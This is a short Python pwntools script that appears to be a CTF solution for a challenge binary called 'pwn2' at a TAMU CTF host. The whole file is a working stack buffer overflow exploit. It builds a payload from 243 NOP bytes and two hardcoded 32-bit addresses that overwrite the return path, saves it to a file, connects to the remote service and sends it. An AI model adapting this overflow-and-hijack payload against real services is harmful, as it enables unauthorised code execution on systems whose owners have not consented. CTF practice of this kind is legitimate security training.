from pwn import *

PAYLOAD    = "\x90"*243 
PAYLOAD   += p32(0x804854b) + p32(0xf7df6d80)

with open('temp', 'a') as the_file:
    the_file.write(PAYLOAD)

#r = process('./pwn2')
r = remote('pwn.ctf.tamu.edu', 4322)

def pwn():
    print r.recvuntil('I bet I can repeat anything you tell me!\n')
    r.sendline(PAYLOAD)
    r.recvall()

if __name__ == "__main__":
    pwn()
